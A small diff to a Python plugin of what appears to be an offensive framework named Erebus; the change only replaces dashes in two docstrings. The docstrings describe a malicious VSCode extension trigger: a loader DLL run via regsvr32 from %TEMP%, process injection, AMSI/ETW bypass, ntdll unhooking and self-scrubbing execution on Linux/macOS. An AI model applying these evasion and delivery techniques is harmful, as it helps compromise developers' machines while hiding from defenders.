@@ -57,7 +57,7 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
     """
     VSCode extension trigger using the Erebus.Loader DLL loaded via Node.js require().
     Full injection stack (EarlyCascade/PoolParty/etc.), AMSI/ETW bypass, ntdll unhook.
-    payload.node is supplied by the main builder — no compile happens here.
+    payload.node is supplied by the main builder - no compile happens here.
     """
 
     def __init__(self):
@@ -206,7 +206,7 @@ class VsCodeExtTriggerPlugin(ErebusPlugin):
         Windows: copy bundled DLL to %TEMP%\\<rand>.dll, spawn `regsvr32 /s`
         detached. regsvr32 LoadLibrary fires DllMain (kicks EntryThread), then
         calls DllRegisterServer which blocks on EntryThread until injection
-        completes. Code.exe never loads the DLL — host process stays clean.
+        completes. Code.exe never loads the DLL - host process stays clean.
 
         Linux/macOS: tmpfs write + detached exec, scrubbed after 8s.
         """
